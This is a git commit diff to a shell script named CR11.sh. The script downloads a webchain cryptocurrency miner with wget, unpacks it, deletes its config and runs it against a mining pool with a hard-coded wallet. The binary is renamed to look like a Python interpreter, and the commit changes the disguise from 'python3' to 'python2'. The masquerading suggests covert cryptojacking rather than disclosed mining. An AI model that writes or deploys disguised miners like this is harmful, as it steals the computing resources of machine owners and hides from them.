bb5e0415e36616079d866409b2112451aba9b450
haidanglx <40859600+haidanglx@users.noreply.github.com>
2018-11-21 14:52:47 +0700

    Update CR11.sh

--- CR11.sh
+++ CR11.sh
@@ -18,7 +18,7 @@ then
 else
 
 echo "Miner da install , chay thoi "
-./python3 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python2 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
      
 fi
@@ -28,8 +28,8 @@ fi
 
 wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2.0/webchain-miner-2.6.2.0-linux-amd64.tar.gz
 tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
-mv webchain-miner python3
+mv webchain-miner python2
 rm config.json
-./python3 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python2 -o pool.webchain.network:3333 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
 exit 0
